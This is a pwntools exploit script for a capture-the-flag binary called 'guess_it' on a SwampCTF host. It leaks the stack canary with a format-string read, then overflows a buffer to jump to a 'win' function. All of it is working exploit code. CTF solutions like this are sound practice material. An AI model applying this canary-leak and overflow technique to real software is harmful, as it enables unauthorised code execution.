#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './guess_it'
elf = context.binary = ELF(exe, checksec=True)
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'chals.swampctf.com', 64236

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break win
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    nop_ret = 0x040112f
    # 31$p canary    
    io.sendlineafter(b'>', b'Yes')
    io.sendline(b'%31$p')

    io.recvuntil(b'0x')
    canary = int(io.recvline(), 16)
    success('Canary %#x', canary)

    offset = 8
    payload = b'\x00' * 8
    payload += p64(canary)
    payload += p64(nop_ret)
    payload += p64(nop_ret)
    payload += p64(elf.sym['win'])

    io.sendline(payload)
    io.sendline(b'No')
    io.interactive()
    
if __name__ == '__main__':
    exploit()